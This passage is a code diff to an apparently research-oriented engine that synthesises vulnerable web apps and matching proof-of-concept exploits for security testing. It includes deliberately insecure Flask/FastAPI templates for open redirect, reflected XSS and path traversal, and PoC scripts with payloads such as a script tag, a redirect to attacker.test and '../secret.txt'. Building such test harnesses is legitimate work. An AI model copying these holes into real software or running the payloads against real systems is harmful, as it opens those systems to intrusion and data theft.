@@ -25,6 +25,7 @@ from common.deps.stdlib import load_stdlib_spec
 from common.logging import get_logger
 from common.prompts import build_guard_autofix_prompt, build_synthesis_prompt
 from common.paths import ensure_dir
+from common.researcher_report import normalize_researcher_report_payload
 from common.roles import normalize_role, role_matches
 from common.vuln_semantics import (
     evaluate_manifest_semantics,
@@ -32,6 +33,7 @@ from common.vuln_semantics import (
     normalize_vuln_id,
     semantic_error_summary,
 )
+from common.vuln_catalog import resolve_vuln_catalog_entry
 from evals.static_signatures import analyze_static_signals
 from common.rules import RuleSpec, load_rule, load_rulespec
 
@@ -179,6 +181,8 @@ class CandidateReport:
     family_override_applied: bool = False
     llm_stub_used: bool = False
     llm_fixture_used: bool = False
+    llm_provider_attempted: bool = False
+    llm_provider_succeeded: bool = False
     llm_failure_class: str = ""
     llm_failure_message: str = ""
 
@@ -206,6 +210,8 @@ class CandidateReport:
             "family_override_applied": self.family_override_applied,
             "llm_stub_used": self.llm_stub_used,
             "llm_fixture_used": self.llm_fixture_used,
+            "llm_provider_attempted": self.llm_provider_attempted,
+            "llm_provider_succeeded": self.llm_provider_succeeded,
             "llm_failure_class": self.llm_failure_class,
             "llm_failure_message": self.llm_failure_message,
         }
@@ -264,6 +270,7 @@ class SynthesisEngine:
         self._rulespec: Optional[RuleSpec] = None
         self._guard_engine: Optional[GuardEngine] = None
         self._guard_spec_payload: Dict[str, Any] = {}
+        self._researcher_report_payload: Dict[str, Any] = {}
         self._guard_autofix_level: str = "none"
         self._guard_autofix_max_attempts: int = 0
 
@@ -295,6 +302,7 @@ class SynthesisEngine:
         except Exception:  # pragma: no cover - defensive fallback
             self._rulespec = None
         self._guard_spec_payload = guard_spec_payload if isinstance(guard_spec_payload, dict) else {}
+        self._researcher_report_payload = self._parse_researcher_report_payload(researcher_report)
         self._guard_engine = GuardEngine(str(vuln_id or ""), self._guard_spec_payload or None)
         guard_autofix = (
             (self._guard_engine.policy_snapshot.get("autofix") or {})
@@ -324,7 +332,9 @@ class SynthesisEngine:
             )
             raw = self.llm.generate(messages)
             manifest_llm_fixture_used = bool(getattr(self.llm, "fixture_used", False))
-            manifest_llm_stub_used = bool(getattr(self.llm, "use_stub", False)) and not manifest_llm_fixture_used
+            manifest_llm_stub_used = bool(getattr(self.llm, "last_used_stub", False)) and not manifest_llm_fixture_used
+            manifest_llm_provider_attempted = bool(getattr(self.llm, "last_provider_attempted", False))
+            manifest_llm_provider_succeeded = bool(getattr(self.llm, "last_provider_succeeded", False))
             manifest_llm_failure_class = str(getattr(self.llm, "last_error_class", "") or "")
             manifest_llm_failure_message = str(getattr(self.llm, "last_error_message", "") or "")
             manifest = self._parse_manifest(raw, idx)
@@ -372,13 +382,22 @@ class SynthesisEngine:
                     family_override_applied=family_override_applied,
                     llm_stub_used=manifest_llm_stub_used,
                     llm_fixture_used=manifest_llm_fixture_used,
+                    llm_provider_attempted=manifest_llm_provider_attempted,
+                    llm_provider_succeeded=manifest_llm_provider_succeeded,
                     llm_failure_class=manifest_llm_failure_class,
                     llm_failure_message=manifest_llm_failure_message,
                 )
             )
 
-        self._write_candidate_log(reports)
         accepted = [report for report in reports if not report.violations]
+        if not accepted:
+            recovery = self._semantic_guided_recovery_candidate(reports=reports, poc_template=poc_template)
+            if recovery is not None:
+                reports.append(recovery)
+                if not recovery.violations:
+                    accepted = [recovery]
+
+        self._write_candidate_log(reports)
         if not accepted:
             self._record_guard_failure(reports)
             violation_lines = [
@@ -803,12 +822,99 @@ class SynthesisEngine:
                 entry["role"] = role
         return manifest
 
+    def _semantic_guided_recovery_candidate(
+        self,
+        *,
+        reports: List[CandidateReport],
+        poc_template: Dict[str, Any],
+    ) -> CandidateReport | None:
+        if not self._dynamic_eval_enabled():
+            return None
+        family = self._semantic_guided_fallback_family()
+        if not family:
+            return None
+        vuln_id = self._requirement.get("vuln_id", "CWE-UNKNOWN")
+        normalized_vuln = normalize_vuln_id(str(vuln_id or ""))
+        stack = self._fallback_stack_id()
+        notes = (
+            "Semantic-guided recovery manifest auto-generated because all LLM candidates violated guard rails. "
+            "The layout is intentionally minimal and preserves family-specific semantics for degraded-mode testing."
+        )
+        success_signature = str(poc_template.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
+        flag_token = poc_template.get("flag_token")
+        if not isinstance(flag_token, str) or not flag_token.strip():
+            flag_token = ""
+        manifest = self._semantic_guided_fallback_manifest(
+            family=family,
+            vuln_id=str(vuln_id),
+            normalized_vuln=normalized_vuln,
+            stack=str(stack),
+            port=8000,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+        )
+        if not manifest:
+            return None
+        manifest = self._apply_poc_template(manifest, poc_template)
+        manifest = self._ensure_fallback_poc(manifest, poc_template)
+        before_family_override = json.dumps(manifest, sort_keys=True, ensure_ascii=False)
+        manifest = self._stabilize_pattern_specific_artifacts(manifest, poc_template)
+        family_override_applied = bool(
+            self._is_template_injection_family()
+            and before_family_override != json.dumps(manifest, sort_keys=True, ensure_ascii=False)
+        )
+        manifest = self._inject_user_deps(manifest)
+        declared = self._extract_declared_dependencies(manifest)
+        required_static = self._detect_required_dependencies(manifest)
+        llm_section = None
+        if self._dep_guard_config.get("llm_assist") or self._auto_patch_enabled:
+            llm_section = self._llm_infer_dependencies(manifest, required_static, declared)
+        auto_patch_info = (
+            self._maybe_auto_patch_dependencies(manifest, declared, required_static, llm_section)
+            if self._auto_patch_enabled
+            else {"enabled": False}
+        )
+        if auto_patch_info.get("patched") or auto_patch_info.get("synced_requirements"):
+            declared = self._extract_declared_dependencies(manifest)
+        violations, guard_report = self._guard_manifest_with_autofix(
+            manifest,
+            precomputed_llm=llm_section,
+            auto_patch=auto_patch_info,
+        )
+        static_report = self._analyze_static_signals(manifest)
+        score = self._score_candidate(len(violations), static_report.get("score", 0.0))
+        return CandidateReport(
+            index=len(reports) + 1,
+            manifest=manifest,
+            raw_response='{"recovery":"semantic_guided"}',
+            violations=violations,
+            score=score,
+            static_report=static_report,
+            guard_report=guard_report,
+            fallback_used=True,
+            fallback_class=self._manifest_fallback_class(manifest),
+            family_override_applied=family_override_applied,
+            llm_stub_used=any(report.llm_stub_used for report in reports),
+            llm_fixture_used=any(report.llm_fixture_used for report in reports),
+            llm_provider_attempted=any(report.llm_provider_attempted for report in reports),
+            llm_provider_succeeded=any(report.llm_provider_succeeded for report in reports),
+            llm_failure_class=next(
+                (report.llm_failure_class for report in reversed(reports) if report.llm_failure_class),
+                "",
+            ),
+            llm_failure_message=next(
+                (report.llm_failure_message for report in reversed(reports) if report.llm_failure_message),
+                "",
+            ),
+        )
+
     def _fallback_manifest(self) -> Dict[str, Any]:
         """Deterministic manifest used when the LLM stub is active."""
 
         vuln_id = self._requirement.get("vuln_id", "CWE-UNKNOWN")
         normalized_vuln = normalize_vuln_id(str(vuln_id or ""))
-        stack = self._requirement.get("framework") or self._requirement.get("language", "python")
+        stack = self._fallback_stack_id()
         notes = (
             "Fallback manifest auto-generated because the LLM response was not valid JSON or the LLM call failed. "
             "The layout is intentionally minimal and attempts to preserve family-specific semantics for degraded-mode testing."
@@ -820,7 +926,22 @@ class SynthesisEngine:
             flag_token = ""
 
         port = 8000
-        if self._is_sqli_family():
+        semantic_guided_family = self._semantic_guided_fallback_family()
+        if self._dynamic_eval_enabled() and semantic_guided_family:
+            semantic_manifest = self._semantic_guided_fallback_manifest(
+                family=semantic_guided_family,
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+            if semantic_manifest:
+                return semantic_manifest
+        allow_family_aware_fallback = self._allow_family_aware_fallback()
+        if allow_family_aware_fallback and self._is_sqli_family():
             return self._fallback_manifest_sqli(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -830,7 +951,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_csrf_family():
+        if allow_family_aware_fallback and self._is_csrf_family():
             return self._fallback_manifest_csrf(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -840,7 +961,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_ssrf_family():
+        if allow_family_aware_fallback and self._is_ssrf_family():
             return self._fallback_manifest_ssrf(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -850,7 +971,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_xss_family():
+        if allow_family_aware_fallback and self._is_xss_family():
             return self._fallback_manifest_xss(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -860,7 +981,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_deserialization_family():
+        if allow_family_aware_fallback and self._is_deserialization_family():
             return self._fallback_manifest_deserialization(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -870,7 +991,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_template_injection_family():
+        if allow_family_aware_fallback and self._is_template_injection_family():
             return self._fallback_manifest_template_injection(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -880,7 +1001,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_open_redirect_family():
+        if allow_family_aware_fallback and self._is_open_redirect_family():
             return self._fallback_manifest_open_redirect(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -890,7 +1011,7 @@ class SynthesisEngine:
                 success_signature=success_signature,
                 flag_token=flag_token,
             )
-        if self._is_path_traversal_family():
+        if allow_family_aware_fallback and self._is_path_traversal_family():
             return self._fallback_manifest_path_traversal(
                 vuln_id=str(vuln_id),
                 normalized_vuln=normalized_vuln,
@@ -939,10 +1060,13 @@ class SynthesisEngine:
         )
         readme_content = self._render_fallback_asset(
             "fallback_bundle_readme.md.tmpl",
-            {
-                "__VULN_ID__": vuln_id,
-                "__PORT__": str(port),
-            },
+            self._fallback_readme_context(
+                vuln_id=vuln_id,
+                port=port,
+                service_path="app.py",
+                success_signature=success_signature,
+                flag_token=flag_token,
+            ),
         )
 
         return {
@@ -993,6 +1117,951 @@ class SynthesisEngine:
                 "fallback_class": "generic_unsupported_family",
             },
         }
+
+    def _dynamic_eval_enabled(self) -> bool:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        policy = requirement.get("policy") if isinstance(requirement.get("policy"), dict) else {}
+        if not isinstance(policy, dict):
+            return False
+        if bool(policy.get("dynamic_eval")):
+            return True
+        return self._is_name_driven_requirement() and self._name_only_mode() in {"dynamic", "strict_dynamic"}
+
+    def _name_only_mode(self) -> str:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        policy = requirement.get("policy") if isinstance(requirement.get("policy"), dict) else {}
+        if not isinstance(policy, dict):
+            return "compatibility"
+        token = str(policy.get("name_only_mode") or "").strip().lower()
+        if token in {"dynamic", "strict_dynamic"}:
+            return token
+        return "compatibility"
+
+    def _is_name_driven_requirement(self) -> bool:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        request_identity = requirement.get("request_identity") if isinstance(requirement.get("request_identity"), dict) else {}
+        if isinstance(request_identity, dict) and request_identity.get("name_driven") is True:
+            return True
+        vuln_id = str(requirement.get("vuln_id") or "").strip().upper()
+        return vuln_id.startswith("NAME-")
+
+    @staticmethod
+    def _parse_researcher_report_payload(raw: str) -> Dict[str, Any]:
+        text = str(raw or "").strip()
+        if not text or text == "(none provided)":
+            return {}
+        try:
+            payload = json.loads(text)
+        except Exception:
+            return {}
+        return normalize_researcher_report_payload(payload) if isinstance(payload, dict) else {}
+
+    def _family_hypothesis_summary(self) -> Dict[str, Any]:
+        payload = self._researcher_report_payload if isinstance(self._researcher_report_payload, dict) else {}
+        summary = payload.get("family_hypothesis_summary") if isinstance(payload.get("family_hypothesis_summary"), dict) else {}
+        return summary if isinstance(summary, dict) else {}
+
+    def _request_identity_guided_family(self) -> str:
+        requirement = self._requirement if isinstance(self._requirement, dict) else {}
+        request_identity = requirement.get("request_identity") if isinstance(requirement.get("request_identity"), dict) else {}
+        name_resolution = requirement.get("name_resolution") if isinstance(requirement.get("name_resolution"), dict) else {}
+        resolved_vuln_id = str(
+            (request_identity or {}).get("resolved_vuln_id")
+            or (name_resolution or {}).get("resolved_vuln_id")
+            or requirement.get("vuln_id")
+            or ""
+        ).strip()
+        request_label = str((request_identity or {}).get("request_label") or requirement.get("vuln_name") or "").strip()
+        match_class = str((request_identity or {}).get("match_class") or (name_resolution or {}).get("match_class") or "").strip().lower()
+        confidence = str((request_identity or {}).get("confidence") or (name_resolution or {}).get("confidence") or "").strip().lower()
+        if match_class not in {"catalog_alias", "exact_identifier"} or confidence != "high":
+            return ""
+        entry = resolve_vuln_catalog_entry(
+            vuln_id=resolved_vuln_id,
+            raw_label=request_label,
+        )
+        if not isinstance(entry, dict):
+            return ""
+        return str(entry.get("family") or "").strip().lower()
+
+    def _can_use_request_identity_guided_family(self, family: str) -> bool:
+        if not family:
+            return False
+        if not self._is_name_driven_requirement():
+            return False
+        if self._name_only_mode() == "strict_dynamic":
+            return False
+        if not self._dynamic_eval_enabled():
+            return False
+        report = self._researcher_report_payload if isinstance(self._researcher_report_payload, dict) else {}
+        search_degraded = report.get("search_degraded") is True
+        quality_reason = str(report.get("quality_reason") or "").strip().lower()
+        evidence_relevance = report.get("evidence_relevance") if isinstance(report.get("evidence_relevance"), dict) else {}
+        relevance_confidence = str((evidence_relevance or {}).get("confidence") or "").strip().lower()
+        top_family = str((self._family_hypothesis_summary() or {}).get("top_family") or "").strip().lower()
+        top_confidence = str((self._family_hypothesis_summary() or {}).get("top_confidence") or "").strip().lower()
+        request_family = self._request_identity_guided_family()
+        if request_family != family:
+            return False
+        # Only allow this recovery when retrieval is clearly degraded/noisy.
+        if not search_degraded and "guard fallback mode" not in quality_reason and relevance_confidence not in {"low", ""}:
+            return False
+        # Do not override a strong conflicting family hypothesis.
+        if top_family and top_family != family and top_confidence not in {"", "low"}:
+            return False
+        return True
+
+    def _family_hypothesis_allows_semantic_guided_family(self, family: str) -> bool:
+        summary = self._family_hypothesis_summary()
+        if not summary:
+            return True
+        top_family = str(summary.get("top_family") or "").strip().lower()
+        top_confidence = str(summary.get("top_confidence") or "").strip().lower()
+        ambiguous = summary.get("ambiguous") is True
+        contradiction_count = summary.get("contradiction_count")
+        try:
+            top_margin = float(summary.get("top_margin") or 0.0)
+        except Exception:
+            top_margin = 0.0
+        if top_family and top_family != family:
+            if self._can_use_request_identity_guided_family(family):
+                return True
+            return False
+        if top_confidence in {"", "low"}:
+            if self._can_use_request_identity_guided_family(family):
+                return True
+            return False
+        if ambiguous:
+            if self._can_use_request_identity_guided_family(family):
+                return True
+            return False
+        if isinstance(contradiction_count, (int, float)) and contradiction_count > 0:
+            if self._name_only_mode() == "strict_dynamic":
+                return False
+            if not self._dynamic_eval_enabled():
+                return False
+            if top_confidence != "high":
+                if self._can_use_request_identity_guided_family(family):
+                    return True
+                return False
+            if float(contradiction_count) > 1:
+                if self._can_use_request_identity_guided_family(family):
+                    return True
+                return False
+            if top_margin < 0.30:
+                if self._can_use_request_identity_guided_family(family):
+                    return True
+                return False
+        return True
+
+    def _fallback_readme_context(
+        self,
+        *,
+        vuln_id: str,
+        port: int,
+        service_path: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, str]:
+        return {
+            "__VULN_ID__": vuln_id,
+            "__PORT__": str(port),
+            "__SERVICE_PATH__": service_path,
+            "__SUCCESS_SIGNATURE__": success_signature,
+            "__FLAG_TOKEN_OR_NONE__": flag_token or "none",
+        }
+
+    def _semantic_guided_signature(self) -> Dict[str, List[str]]:
+        signature = self._guard_spec_payload.get("semantic_signature") if isinstance(self._guard_spec_payload, dict) else {}
+        if not isinstance(signature, dict):
+            return {}
+        normalized: Dict[str, List[str]] = {}
+        for bucket in ("input_vector", "sink", "exploit_precondition"):
+            values = signature.get(bucket) if isinstance(signature.get(bucket), list) else []
+            normalized[bucket] = [
+                str(item).strip().lower()
+                for item in values
+                if isinstance(item, str) and str(item).strip()
+            ]
+        return normalized
+
+    def _semantic_guided_fallback_family(self) -> str:
+        signature = self._semantic_guided_signature()
+        if not signature:
+            return ""
+        sink_terms = set(signature.get("sink") or [])
+        precondition_terms = set(signature.get("exploit_precondition") or [])
+        input_terms = set(signature.get("input_vector") or [])
+        if (
+            "render_template_string" in sink_terms
+            and any("template injection" in term or "server-side template injection" in term for term in precondition_terms)
+        ):
+            family = "template_injection"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any("cross-site scripting" in term or "unescaped reflection" in term or "<script>" in term for term in precondition_terms):
+            family = "xss"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if "redirect(" in sink_terms or any("open redirect" in term or "external redirect" in term for term in precondition_terms):
+            family = "open_redirect"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any(term in sink_terms for term in {"open(", "send_file", "send_from_directory"}) or any(
+            "path traversal" in term or "../" in term for term in precondition_terms
+        ):
+            family = "path_traversal"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any(term in sink_terms for term in {"requests.get", "urllib.request", "http client request"}) or any(
+            "server-side request forgery" in term for term in precondition_terms
+        ):
+            family = "ssrf"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any(term in sink_terms for term in {"pickle.loads", "yaml.load", "jsonpickle.decode"}) or any(
+            "untrusted deserialization" in term or "serialized input" in term for term in precondition_terms
+        ):
+            family = "deserialization"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any("missing csrf token validation" in term for term in precondition_terms) or "cross-site request" in input_terms:
+            family = "csrf"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        if any(term in sink_terms for term in {"sql query execution", "sqlite3.execute", "cur.execute"}) or any(
+            "sql injection" in term for term in precondition_terms
+        ):
+            family = "sqli"
+            return family if self._family_hypothesis_allows_semantic_guided_family(family) else ""
+        return ""
+
+    def _semantic_guided_fallback_manifest(
+        self,
+        *,
+        family: str,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any] | None:
+        builders = {
+            "open_redirect": self._minimal_dynamic_manifest_open_redirect,
+            "xss": self._minimal_dynamic_manifest_xss,
+            "path_traversal": self._minimal_dynamic_manifest_path_traversal,
+            "ssrf": self._minimal_dynamic_manifest_ssrf,
+            "deserialization": self._minimal_dynamic_manifest_deserialization,
+            "sqli": self._fallback_manifest_sqli,
+            "csrf": self._fallback_manifest_csrf,
+            "template_injection": self._fallback_manifest_template_injection,
+        }
+        builder = builders.get(family)
+        if builder is None:
+            return None
+        manifest = builder(
+            vuln_id=vuln_id,
+            normalized_vuln=normalized_vuln,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["fallback_class"] = "semantic_guided"
+        metadata["semantic_guided_family"] = family
+        metadata.setdefault("materializer", "asset_template")
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _minimal_dynamic_manifest_open_redirect(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        if self._fastapi_stack(stack):
+            app_content = "\n".join(
+                [
+                    "from fastapi import FastAPI",
+                    "from fastapi.responses import JSONResponse, RedirectResponse",
+                    "",
+                    "app = FastAPI()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/redirect')",
+                    "def bounce(next: str = ''):",
+                    "    if not next:",
+                    "        return JSONResponse({'error': 'missing next'}, status_code=400)",
+                    "    return RedirectResponse(url=next, status_code=302)",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\n"
+        else:
+            app_content = "\n".join(
+                [
+                    "from flask import Flask, request, redirect, jsonify",
+                    "",
+                    "app = Flask(__name__)",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/redirect')",
+                    "def bounce():",
+                    "    next_url = request.args.get('next', '')",
+                    "    if not next_url:",
+                    "        return jsonify({'error': 'missing next'}), 400",
+                    "    return redirect(next_url, code=302)",
+                    "",
+                    "if __name__ == '__main__':",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\n"
+        poc_content = "\n".join(
+            [
+                "import argparse",
+                "import sys",
+                "from urllib.error import HTTPError",
+                "from urllib.request import HTTPRedirectHandler, Request, build_opener",
+                "",
+                f"SUCCESS_SIGNATURE = {success_signature!r}",
+                f"FLAG_TOKEN = {flag_token!r}",
+                "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "REDIRECT_TARGET = 'https://attacker.test/owned'",
+                "",
+                "class NoRedirectHandler(HTTPRedirectHandler):",
+                "    def redirect_request(self, req, fp, code, msg, headers, newurl):",
+                "        return None",
+                "",
+                "def main() -> int:",
+                "    parser = argparse.ArgumentParser()",
+                "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    args = parser.parse_args()",
+                "    url = args.base_url.rstrip('/') + '/redirect?next=' + REDIRECT_TARGET",
+                "    opener = build_opener(NoRedirectHandler())",
+                "    request = Request(url, method='GET')",
+                "    status = 0",
+                "    location = ''",
+                "    try:",
+                "        response = opener.open(request, timeout=5)",
+                "        status = getattr(response, 'status', None) or response.getcode()",
+                "        location = response.headers.get('Location', '')",
+                "    except HTTPError as exc:",
+                "        status = exc.code",
+                "        location = exc.headers.get('Location', '')",
+                "    if status in {301, 302, 303, 307, 308} and REDIRECT_TARGET in location:",
+                "        print(SUCCESS_SIGNATURE)",
+                "        if FLAG_TOKEN:",
+                "            print(FLAG_TOKEN)",
+                "        return 0",
+                "    print(f'Unexpected redirect response: code={status} location={location}')",
+                "    return 1",
+                "",
+                "if __name__ == '__main__':",
+                "    raise SystemExit(main())",
+                "",
+            ]
+        )
+        manifest = self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content=requirements_content,
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["materializer"] = "minimal_dynamic"
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _minimal_dynamic_manifest_xss(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        if self._fastapi_stack(stack):
+            app_content = "\n".join(
+                [
+                    "from fastapi import FastAPI",
+                    "from fastapi.responses import HTMLResponse",
+                    "",
+                    "app = FastAPI()",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/echo', response_class=HTMLResponse)",
+                    "def echo(q: str = ''):",
+                    "    return f'<html><body>{q}</body></html>'",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\n"
+        else:
+            app_content = "\n".join(
+                [
+                    "from flask import Flask, request, Response, jsonify",
+                    "",
+                    "app = Flask(__name__)",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/echo')",
+                    "def echo():",
+                    "    payload = request.args.get('q', '')",
+                    "    return Response(f'<html><body>{payload}</body></html>', mimetype='text/html')",
+                    "",
+                    "if __name__ == '__main__':",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\n"
+        poc_content = "\n".join(
+            [
+                "import argparse",
+                "from urllib.request import Request, urlopen",
+                "",
+                f"SUCCESS_SIGNATURE = {success_signature!r}",
+                f"FLAG_TOKEN = {flag_token!r}",
+                "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "PAYLOAD = '<script>alert(1)</script>'",
+                "",
+                "def main() -> int:",
+                "    parser = argparse.ArgumentParser()",
+                "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    args = parser.parse_args()",
+                "    url = args.base_url.rstrip('/') + '/echo?q=' + PAYLOAD",
+                "    request = Request(url, method='GET')",
+                "    with urlopen(request, timeout=5) as response:",
+                "        body = response.read().decode('utf-8', errors='ignore')",
+                "    if PAYLOAD in body:",
+                "        print(SUCCESS_SIGNATURE)",
+                "        if FLAG_TOKEN:",
+                "            print(FLAG_TOKEN)",
+                "        return 0",
+                "    print('Payload was not reflected verbatim')",
+                "    return 1",
+                "",
+                "if __name__ == '__main__':",
+                "    raise SystemExit(main())",
+                "",
+            ]
+        )
+        manifest = self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content=requirements_content,
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+        metadata = manifest.get("metadata") if isinstance(manifest.get("metadata"), dict) else {}
+        metadata["materializer"] = "minimal_dynamic"
+        manifest["metadata"] = metadata
+        return manifest
+
+    def _minimal_dynamic_manifest_path_traversal(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        effective_flag = flag_token or "FLAG{PATH_TRAVERSAL_OK}"
+        if self._fastapi_stack(stack):
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "from fastapi import FastAPI",
+                    "from fastapi.responses import JSONResponse, PlainTextResponse",
+                    "",
+                    "app = FastAPI()",
+                    "BASE_DIR = Path('/tmp/path-demo')",
+                    "PUBLIC_DIR = BASE_DIR / 'public'",
+                    "PUBLIC_DIR.mkdir(parents=True, exist_ok=True)",
+                    "(PUBLIC_DIR / 'note.txt').write_text('safe-note', encoding='utf-8')",
+                    f"(BASE_DIR / 'secret.txt').write_text({effective_flag!r}, encoding='utf-8')",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return {'status': 'ok'}",
+                    "",
+                    "@app.get('/download')",
+                    "def download(path: str = 'note.txt'):",
+                    "    target = os.path.join(str(PUBLIC_DIR), path)",
+                    "    try:",
+                    "        with open(target, 'r', encoding='utf-8', errors='ignore') as handle:",
+                    "            return PlainTextResponse(handle.read())",
+                    "    except FileNotFoundError:",
+                    "        return JSONResponse({'error': 'missing file'}, status_code=404)",
+                    "",
+                    "if __name__ == '__main__':",
+                    "    import uvicorn",
+                    f"    uvicorn.run(app, host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "fastapi==0.115.0\nuvicorn==0.30.6\n"
+        else:
+            app_content = "\n".join(
+                [
+                    "import os",
+                    "from pathlib import Path",
+                    "",
+                    "from flask import Flask, jsonify, request",
+                    "",
+                    "app = Flask(__name__)",
+                    "BASE_DIR = Path('/tmp/path-demo')",
+                    "PUBLIC_DIR = BASE_DIR / 'public'",
+                    "PUBLIC_DIR.mkdir(parents=True, exist_ok=True)",
+                    "(PUBLIC_DIR / 'note.txt').write_text('safe-note', encoding='utf-8')",
+                    f"(BASE_DIR / 'secret.txt').write_text({effective_flag!r}, encoding='utf-8')",
+                    "",
+                    "@app.get('/health')",
+                    "def health():",
+                    "    return jsonify({'status': 'ok'})",
+                    "",
+                    "@app.get('/download')",
+                    "def download():",
+                    "    path = request.args.get('path', 'note.txt')",
+                    "    target = os.path.join(str(PUBLIC_DIR), path)",
+                    "    try:",
+                    "        with open(target, 'r', encoding='utf-8', errors='ignore') as handle:",
+                    "            return handle.read()",
+                    "    except FileNotFoundError:",
+                    "        return jsonify({'error': 'missing file'}), 404",
+                    "",
+                    "if __name__ == '__main__':",
+                    f"    app.run(host='0.0.0.0', port={port})",
+                    "",
+                ]
+            )
+            requirements_content = "Flask==3.0.0\n"
+        poc_content = "\n".join(
+            [
+                "import argparse",
+                "import sys",
+                "from urllib.parse import quote",
+                "from urllib.request import Request, urlopen",
+                "",
+                f"SUCCESS_SIGNATURE = {success_signature!r}",
+                f"FLAG_TOKEN = {effective_flag!r}",
+                "DEFAULT_BASE = 'http://127.0.0.1:8000'",
+                "PAYLOAD = '../secret.txt'",
+                "",
+                "def main() -> int:",
+                "    parser = argparse.ArgumentParser()",
+                "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
+                "    args = parser.parse_args()",
+                "    url = args.base_url.rstrip('/') + '/download?path=' + quote(PAYLOAD)",
+                "    request = Request(url, method='GET')",
+                "    try:",
+                "        with urlopen(request, timeout=5) as response:",
+                "            body = response.read().decode('utf-8', errors='ignore')",
+                "    except Exception as exc:",
+                "        print(f'Path traversal request failed: {exc}', file=sys.stderr)",
+                "        return 1",
